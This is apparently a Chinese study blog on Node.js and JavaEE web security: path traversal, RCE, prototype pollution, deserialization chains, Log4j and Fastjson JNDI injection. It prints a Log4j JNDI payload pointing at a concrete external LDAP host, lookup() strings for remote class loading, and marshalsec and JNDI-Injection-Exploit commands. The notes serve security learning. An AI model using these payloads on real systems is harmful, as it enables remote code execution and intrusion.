<h5 id="安全问题-4"><a href="#安全问题-4" class="headerlink" title="安全问题"></a>安全问题</h5><ul>
<li>DOM-XSS</li>
<li>前端算法泄露</li>
<li>前端验证脆弱性</li>
</ul>
<p>‍</p>
<p>‍</p>
<h4 id="框架类"><a href="#框架类" class="headerlink" title="框架类"></a>框架类</h4><p>‍</p>
<h5 id="Node-JS"><a href="#Node-JS" class="headerlink" title="Node.JS"></a>Node.JS</h5><p>开发指南-NodeJS-安全SecGuide项目</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Tencent/secguide">https://github.com/Tencent/secguide</a></p>
<ol>
<li><p>文档参考：<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/nodejs/">https://www.w3cschool.cn/nodejs/</a></p>
</li>
<li><p>Nodejs安装：<a target="_blank" rel="noopener" href="https://nodejs.org/en">https://nodejs.org/en</a></p>
</li>
<li><p>三方库安装</p>
<ol>
<li><p>express<br> Express是一个简洁而灵活的node.js Web应用框架</p>
</li>
<li><p>body-parser<br> node.js中间件，用于处理 JSON, Raw, Text和URL编码的数据。</p>
</li>
<li><p>cookie-parser<br> 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</p>
</li>
<li><p>multer<br> node.js中间件，用于处理 enctype=“multipart&#x2F;form-data”（设置表单的MIME编码）的表单数据。</p>
</li>
<li><p>mysql<br> Node.js来连接MySQL专用库，并对数据库进行操作</p>
</li>
<li><p>安装命令</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm i express<br>npm i body<span class="hljs-literal">-parser</span><br>npm i cookie<span class="hljs-literal">-parser</span><br>npm i multer<br>npm i mysql<br></code></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<ul>
<li><h6 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h6><p>文件操作</p>
<p>数据库操作</p>
<p>Express</p>
</li>
<li><h6 id="安全问题-5"><a href="#安全问题-5" class="headerlink" title="安全问题"></a>安全问题</h6><ul>
<li><p>前端无代码</p>
</li>
<li><p>常规漏洞</p>
<ol>
<li><p>SQL注入</p>
</li>
<li><p>文件操作</p>
<p> 实现目录读取</p>
<ul>
<li>调用文件管理函数，传递目录参数</li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/file?dir=./">http://127.0.0.1:3000/file?dir=./</a></li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/file?dir=../">http://127.0.0.1:3000/file?dir=…/</a></li>
</ul>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 引入文件系统和 Express 框架</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// 处理 &#x27;/file&#x27; 路径的 GET 请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/file&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-comment">// 从请求中获取目录参数</span><br>    <span class="hljs-keyword">const</span> dir = req.<span class="hljs-property">query</span>.<span class="hljs-property">dir</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dir);<br><br>    **<span class="hljs-comment">// 调用文件管理函数，传递目录参数</span><br>    <span class="hljs-title function_">filemanage</span>(dir);**<br>&#125;);<br><br><span class="hljs-comment">// 启动 Express 应用监听在3000端口</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web应用已启动在3000端口！&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">// 文件管理函数，接收一个目录参数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">filemanage</span>(<span class="hljs-params">dir</span>) &#123;<br>    **<span class="hljs-comment">// 使用 fs.readdir 读取目录下的文件</span><br>    fs.<span class="hljs-title function_">readdir</span>(dir, <span class="hljs-keyword">function</span> (<span class="hljs-params">error, files</span>) &#123;<br>        <span class="hljs-comment">// 打印目录中的文件列表</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(files);**<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240707161007-pi5749l.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>RCE执行</p>
<ol>
<li>eval 调用<strong>代码命令执行</strong>，将字符串当做代码解析</li>
<li>exec &amp; spawnSync <strong>调用系统命令</strong></li>
</ol>
</li>
</ol>
</li>
<li><p>原型链污染</p>
<ol>
<li>如果攻击者控制并修改了一个对象的原型，(<strong>proto</strong>)</li>
<li>那么将可以影响所有和这个对象来自同一个类、父祖类的对象</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>‍</p>
<p>‍</p>
<h4 id="第三方组件类"><a href="#第三方组件类" class="headerlink" title="第三方组件类"></a>第三方组件类</h4><p>‍</p>
<h5 id="第三方JS库"><a href="#第三方JS库" class="headerlink" title="第三方JS库"></a>第三方JS库</h5><ul>
<li><p>JQuery</p>
<p>jQuery是一个快速、简洁的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=JavaScript%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">JavaScript框架</a>,是一个丰富的JavaScript代码库。设计目的是为了写更少的代码，做更多的事情。它封装JavaScript常用功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p>
</li>
<li><p>CVE漏洞</p>
<p>检测：<a target="_blank" rel="noopener" href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a></p>
<p>CVE-2020-11022&#x2F;CVE-2020-11023</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44309905/article/details/120902867">Javascript框架库漏洞验证</a></p>
</li>
</ul>
<p>‍</p>
<h5 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h5><ul>
<li><p>WebPack</p>
<p>Webpack是一个模块打包器。在Webpack中会将前端的所有资源文件都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA">一文看懂webpack打包操作</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">使用 <span class="hljs-title class_">Webpack</span> 的主要原因：<br><span class="hljs-number">1.</span> 模块化支持：<span class="hljs-title class_">Webpack</span> 支持将应用程序拆分为模块，使开发人员能够使用模块化的方式组织和管理代码。模块化能够提高代码的可维护性、重用性和可测试性。<br><span class="hljs-number">2.</span> 资源打包：<span class="hljs-title class_">Webpack</span> 可以将项目中的各种资源（例如 <span class="hljs-title class_">JavaScript</span>、<span class="hljs-variable constant_">CSS</span>、图像等）视为模块，并将它们打包成一个或多个最终的静态资源文件。这样可以减少网络请求的次数，提高应用程序的加载性能。<br><span class="hljs-number">3.</span> 代码分割：<span class="hljs-title class_">Webpack</span> 支持将应用程序的代码分割成多个块（chunks），并在需要时按需加载。这种代码分割的技术可以提高应用程序的初始加载速度，并减小用户需要下载的初始文件大小。<br><span class="hljs-number">4.</span> 资源优化：<span class="hljs-title class_">Webpack</span> 提供了丰富的插件和工具生态系统，可以进行各种资源优化和转换，例如压缩代码、处理样式预处理器、优化图像等。这些优化可以减小资源文件的大小，提高应用程序的性能。<br><span class="hljs-number">5.</span> 开发环境支持：<span class="hljs-title class_">Webpack</span> 提供了强大的开发环境支持，包括开发服务器、热模块替换（<span class="hljs-title class_">Hot</span> <span class="hljs-title class_">Module</span> <span class="hljs-title class_">Replacement</span>）、源代码映射等功能。这些功能可以提升开发效率，加快开发周期。<br></code></pre></td></tr></table></figure></li>
<li><p>源码泄露</p>
<p>原生态JS：前端语言直接浏览器显示源代码</p>
<p>NodeJS：服务段语言浏览器不显示源代码</p>
<p>WebPack：打包模式选择开发者模式后会造成源码泄漏（nodejs vue）</p>
</li>
</ul>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE"><a href="#JavaEE" class="headerlink" title="JavaEE"></a>JavaEE</h3><p>‍</p>
<h4 id="原生类-2"><a href="#原生类-2" class="headerlink" title="原生类"></a>原生类</h4><p>‍</p>
<h5 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h5><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52173163/article/details/121110753">JAVAEE的核心-Servlet</a></p>
<pre><code class="hljs">**Servlet是Server Applet的简称，意思为用Java编写的服务器端的程序,它运行在web服务器中**,它是作为来自**Web浏览器**或其他HTTP客户端的请求和**HTTP服务器**上的**数据库或应用程序**之间的**中间层**。
</code></pre>
<p><strong>Servlet的作用：</strong></p>
<p><strong>1.接收用户发送的请求</strong></p>
<p><strong>2.调用其他的java程序来处理请求</strong></p>
<p><strong>3.根据处理结果，服务器将响应返回给客户端</strong></p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h5 id="JDBC与数据库驱动"><a href="#JDBC与数据库驱动" class="headerlink" title="JDBC与数据库驱动"></a>JDBC与数据库驱动</h5><ul>
<li><p>JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范。原生态数据库开发：JDBC</p>
<p>参考： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ed1a59750127">JavaEE-JDBC基础</a></p>
</li>
<li><p>数据库驱动:</p>
<p>由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用。</p>
</li>
<li><p>预编译sql注入问题</p>
<p>原理：<strong>提前编译好执行逻辑，你注入的语句不会改变原有逻辑</strong></p>
<p><img src="/assets/image-20240714111201-0cy59z4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 预编译写法</span><br><span class="hljs-title class_">String</span> safesql = <span class="hljs-string">&quot;SELECT * FROM news WHERE id=?&quot;</span>;<br><br><span class="hljs-comment">// 使用PreparedStatement</span><br><span class="hljs-title function_">try</span> (<span class="hljs-title class_">PreparedStatement</span> preparedStatement = connection.<span class="hljs-title function_">prepareStatement</span>(safesql)) &#123;<br>    <span class="hljs-comment">// 设置参数，防止SQL注入攻击</span><br>    preparedStatement.<span class="hljs-title function_">setInt</span>(<span class="hljs-number">1</span>, id);<br><br>    <span class="hljs-comment">// 执行查询</span><br>    <span class="hljs-title class_">ResultSet</span> resultSet = preparedStatement.<span class="hljs-title function_">executeQuery</span>();<br><br>    <span class="hljs-comment">// 处理结果集...</span><br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">SQLException</span> e) &#123;<br>    e.<span class="hljs-title function_">printStackTrace</span>();<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">预编译写法： safesql 是一个预编译的 <span class="hljs-variable constant_">SQL</span> 查询语句，其中 ? 是一个占位符，表示将在执行时动态替换。<br>使用 <span class="hljs-title class_">PreparedStatement</span>： <span class="hljs-title class_">PreparedStatement</span> 是 <span class="hljs-title class_">Statement</span> 的子接口，用于执行预编译的 <span class="hljs-variable constant_">SQL</span> 语句。通过调用 connection.<span class="hljs-title function_">prepareStatement</span>(safesql) 创建一个 <span class="hljs-title class_">PreparedStatement</span> 对象。<br>设置参数： 使用 setXXX 方法设置占位符的值。在这里，使用 <span class="hljs-title function_">setInt</span>(<span class="hljs-number">1</span>, id) 将 id 的值设置到第一个占位符上。这种方式防止了 <span class="hljs-variable constant_">SQL</span> 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。<br>执行查询： 调用 <span class="hljs-title function_">executeQuery</span>() 执行查询，得到 <span class="hljs-title class_">ResultSet</span> 对象。<br>处理结果集： 根据业务需要，处理查询结果集的数据。<br></code></pre></td></tr></table></figure></li>
</ul>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h5 id="过滤器-Filter-和监听器-Listener"><a href="#过滤器-Filter-和监听器-Listener" class="headerlink" title="过滤器(Filter)和监听器(Listener)"></a>过滤器(Filter)和监听器(Listener)</h5><p>原理图解：</p>
<p><img src="/assets/image-20240714171514-ilgf0pf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p>Filter(过滤器)</p>
<p><img src="/assets/image-20240714172521-mt14nwz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/GavinGroves/article/details/135834426?ops_request_misc=&request_id=&biz_id=102&utm_term=javaweb%20%E8%BF%87%E6%BB%A4%E5%99%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-135834426.142%5Ev100%5Epc_search_result_base9&spm=1018.2226.3001.4187">JavaWeb过滤器 Filter</a></p>
</li>
<li><p>过滤器安全场景：Payload检测，权限访问控制，红队内存马植入，蓝队清理内存马等</p>
<p>过滤器实际上就是<strong>对Web资源进行拦截</strong>，做一些处理后再交给下一个过滤器或Servlet处理，<strong>通常都是用来拦截request</strong>进行处理的，也可以对返回的 response进行拦截处理。</p>
<p>开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p>
</li>
<li><p>Listener(监听器)</p>
<p><img src="/assets/image-20240714172442-56hudlm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52797170/article/details/124023760">JavaWeb监听器 Listener</a></p>
<p>监听器安全场景：代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等</p>
<p>用途：</p>
<ul>
<li>用来监听ServletContext、HttpSession和ServletRequest等域对象的创建和销毁事件</li>
<li>用来监听域对象的属性发生修改的事件</li>
<li>可以在事件发生前、发生后做一些必要的处理</li>
</ul>
</li>
</ul>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h5 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h5><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p>
<p>什么是Java反射？</p>
<p>Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。<br>该类库包含了Field、Method、Constructor等类。对<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">成员变量</a>，成员方法和构造方法的信息进行的编程**&#x3D;&#x3D;操作&#x3D;&#x3D;**可以理解为反射机制。</p>
<p>‍</p>
<p>为什么要用到反射？</p>
<p>在运行时获得<strong>程序</strong>或<strong>程序集</strong>中每一个类型的<strong>成员和成员的信息</strong>，从而<strong>动态的创建、修改、调用、获取其属性</strong>，而<strong>不需要事先知道运行的对象是谁</strong>。划重点：<strong>在运行时而不是编译时</strong>。（<strong>不改变原有代码逻辑，自行运行的时候动态创建和编译即可</strong>）</p>
<p>‍</p>
<p>开发应用场景：<br>Spring框架的IOC基于反射创建对象和设置依赖属性。<br>SpringMVC的请求调用对应方法，也是通过反射。<br>JDBC的Class#forName(String className)方法，也是使用反射</p>
<p>‍</p>
<p>安全应用场景：</p>
<p>构造利用链，触发命令执行<br><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>中的利用链构造<br>动态获取或执行任意类中的属性或方法<br>动态代理的底层原理是反射技术<br>rmi反序列化也涉及到反射操作</p>
<p>‍</p>
<h6 id="类反射调用"><a href="#类反射调用" class="headerlink" title="类反射调用"></a>类反射调用</h6><p><img src="/assets/image-20240714214903-mi09szx.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ol>
<li>Class对象类</li>
<li>Filed成员变量类</li>
<li>Method成员方法类</li>
<li>Constructor构造方法</li>
</ol>
<p>‍</p>
<h6 id="安全问题—反序列化利用链"><a href="#安全问题—反序列化利用链" class="headerlink" title="安全问题—反序列化利用链"></a>安全问题—反序列化利用链</h6><p>‍</p>
<p>‍</p>
<h5 id="Serializer"><a href="#Serializer" class="headerlink" title="Serializer"></a>Serializer</h5><p><img src="/assets/image-20240715001203-wk96msu.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<h6 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h6><ul>
<li>序列化：将内存中的对象压缩成字节流</li>
<li>反序列化：将字节流转化成内存中的对象</li>
</ul>
<p>‍</p>
<p>序列化技术因何产生？</p>
<p><img src="/assets/image-20240715001828-aqcwxox.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p>序列化与反序列化的设计就是用来传输数据的。</p>
</li>
<li><p>当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。</p>
</li>
<li><p>能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</p>
</li>
</ul>
<p>‍</p>
<p>反序列化利用链</p>
<p>(1) 入口类的readObject直接调用危险方法<br>(2) 入口参数中包含可控类，该类有危险方法，readObject时调用<br>(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用<br>(4) 构造函数&#x2F;静态代码块等类加载时隐式执行</p>
<p>‍</p>
<p>‍</p>
<h6 id="触发类"><a href="#触发类" class="headerlink" title="触发类"></a>触发类</h6><ul>
<li>JAVA内置的writeObject()&#x2F;readObject()</li>
<li>JAVA内置的XMLDecoder&#x2F;XMLEncoder()</li>
<li>XStream</li>
<li>SnakeYaml</li>
<li>FastJson</li>
<li>Jackson</li>
</ul>
<p>‍</p>
<h6 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h6><p>见环境复现</p>
<ul>
<li>重写方法</li>
<li>触发方法</li>
</ul>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h4 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h4><p>‍</p>
<h5 id="技术—项目管理"><a href="#技术—项目管理" class="headerlink" title="技术—项目管理"></a>技术—项目管理</h5><h6 id="Jar-仓库"><a href="#Jar-仓库" class="headerlink" title="Jar 仓库"></a>Jar 仓库</h6><p><a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a></p>
<h6 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h6><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/259780.htm">IDEA配置Maven的超详细步骤</a></p>
<p>‍</p>
<h6 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h6><pre><code class="hljs">     JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。用于在**分布式环境中查找和访问命名和目录服务**。它允许Java应用程序通过名称引用资源，如数据库连接、远程对象等。
</code></pre>
<p>原理：通过其本身自带的rmi以及ldap这些api接口远程调用class文件实现注入</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a></p>
<p><img src="/assets/image-20240715233744-qu6wezv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>‍</p>
<h5 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h5><p>‍</p>
<h6 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h6><p>‍</p>
<p>Log4j是什么？</p>
<pre><code class="hljs">      是Apache为Java提供的**开源的日志管理工具**，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。
</code></pre>
<p>‍</p>
<p>‍</p>
<p>Log4j中有三大组件：</p>
<p>日志器（Logger）、日志输出目标（Appender）、格式化器（Layout）</p>
<p>1、Logger：用来输出日志消息的类，它可以输出不同级别的消息，例如错误消息、警告消息等；</p>
<p>2、Appender；通常我们希望日志输出到文件中，以及控制台，也可能希望日志输出数据库，该类就表示一个输出的目标；</p>
<p>3、Layout：对输出的消息进行格式化，例如在消息中添加日期，以及级别等。</p>
<p>‍</p>
<p>‍</p>
<p><strong>Log4j 2.x 中的 JNDI 注入漏洞LDAP</strong>，允许攻击者通过特制的日志消息进行远程代码执行。在这种情况下，攻击者可以利用<strong>恶意构造的 JNDI上下文注入</strong>，<strong>执行恶意的Java代码。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">上下文注入：<br>- 在某些情况下，应用程序会通过用户提供的数据构建 JNDI 上下文（InitialContext）。<br>- 如果应用程序在构建上下文时没有充分验证和过滤用户提供的数据，攻击者可能会尝试通过构造特殊的输入来注入恶意的 JNDI 对象。如：$&#123;jndi:ldap:<span class="hljs-comment">//47.94.236.117:1389/uyhyw6&#125;</span><br></code></pre></td></tr></table></figure>

<p>‍</p>
<p>‍</p>
<h6 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h6><p>参考：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7231197051203207227">Fastjson：快速、简单、可靠的Java JSON处理库 - 掘金 (juejin.cn)</a></p>
<p>‍</p>
<p>‍</p>
<p>Fastjson是什么？</p>
<p>Fastjson是一个Java语言编写的高性能JSON处理库，可以将 Java 对象转换为 JSON 格式（序列化），当然它也可以将 JSON 字符串转换为 Java 对象（反序列化）。</p>
<p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
<p>‍</p>
<p>‍</p>
<p>FastJson JNDI 注入漏洞（JSON ）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span> FastJson 在解析 JSON 数据时，会将 JSON 字符串转换为 Java 对象。<br><span class="hljs-number">2.</span> 攻击者可以通过构造恶意的 JSON 字符串，包含特殊的 JSON 注释和 FastJson 的特性，来触发漏洞。<br><span class="hljs-number">3.</span> 攻击者构造的 JSON 数据可能包含特殊的注释和 FastJson 的特性，以触发漏洞并执行恶意代码。<br><span class="hljs-number">4.</span> 远程代码执行：由于漏洞存在，攻击者可能成功执行远程代码，导致服务器上的不安全操作。<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guo15890025019/article/details/120532891">Fastjson漏洞复现_fastjson 1.2.84-CSDN博客</a></p>
<p>‍</p>
<h5 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h5><h6 id="引用漏洞版本"><a href="#引用漏洞版本" class="headerlink" title="引用漏洞版本"></a>引用漏洞版本</h6><h6 id="使用触发漏洞"><a href="#使用触发漏洞" class="headerlink" title="使用触发漏洞"></a>使用触发漏洞</h6><p>‍</p>
<p>‍</p>
<p>‍</p>
<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p>‍</p>
<p>‍</p>
<h5 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h5><p><img src="/assets/image-20240717103407-os8urbo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<h6 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h6><p>什么是jndi注入<br>为什么有jndi注入<br>JDNI注入安全问题<br>JDNI注入利用条件<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a></p>
<p>‍</p>
<pre><code class="hljs">         JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。
</code></pre>
<ul>
<li><p>RMI：远程方法调用注册表</p>
</li>
<li><p>LDAP：轻量级目录访问协议</p>
</li>
</ul>
<p>‍</p>
<p>‍</p>
<h5 id="利用-限制"><a href="#利用-限制" class="headerlink" title="利用&amp;限制"></a>利用&amp;限制</h5><blockquote>
<p>调用检索：<br>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。javax.naming.InitialContext.lookup()</p>
<p>lookup()：通过名字检索执行的对象</p>
<p>‍</p>
<p>在RMI服务中调用了InitialContext.lookup()的类有：</p>
<ul>
<li><p>org.springframework.transaction.jta.JtaTransactionManager.readObject()</p>
</li>
<li><p>com.sun.rowset.JdbcRowSetImpl.execute()</p>
</li>
<li><p>javax.management.remote.rmi.RMIConnector.connect()</p>
</li>
<li><p>org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</p>
</li>
</ul>
<p>‍</p>
<p>在LDAP服务中调用了InitialContext.lookup()的类有：</p>
<ul>
<li><p>InitialDirContext.lookup()</p>
</li>
<li><p>Spring LdapTemplate.lookup()</p>
</li>
<li><p>LdapTemplate.lookupContext()</p>
</li>
</ul>
</blockquote>
<p>‍</p>
<ul>
<li><p>JNDI远程调用-JNDI-Injection(下述详细过程见环境复现)</p>
<blockquote>
<p>基于工具自主定义<br>1、使用远程调用(默认端口1389)<br>调用rmi ldap等服务对象类，远程地址的一个class文件被执行<br>​<code>new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</code>​<br>​<code>new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</code>​<br>2、使用利用工具生成调用地址<br>创建一个rmi ldap等服务调用 实例化<br>​<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A xx.xx.xx.xx</code>​</p>
</blockquote>
</li>
<li><p>JNDI远程调用-marshalsec(此工具有绕过jdk高版本的能力，但是不多)</p>
<blockquote>
<p>1 、使用远程调用 ( 默认端口 1389 )<br>​<code>new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</code>​<br>​<code>new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</code>​<br>2、编译调用对象<br>​<code>javac Test.java</code>​<br>3、使用利用工具生成调用协议（rmi,ldap）<br>​<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test</code>​<br>​<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test</code>​<br>4、将生成的Class存放访问路径</p>
</blockquote>
</li>
<li><p>JNDI注入-FastJson漏洞结合</p>
<blockquote>
<p>背景：JavaEE 中接受用户提交的 JSON 数据进行转换 (FastJson 反序列化漏洞)<br>思路：利用 <code>InitialContext.lookup ()</code>​ 中的进行 <code>JdbcRowSetImpl</code>​ 类 JNDI 服务注入<br>漏洞利用 <code>FastJson autotype</code>​ 处理 Json 对象的时候，未对 @type 字段进行完整的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 RMI 主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。</p>
</blockquote>
</li>
</ul>
<p><img src="/assets/image-20240717110159-f3gm6de.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>‍</p>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ul>
<li>marshalsec</li>
<li>JNDI-Injection</li>
</ul>
<p>‍</p>
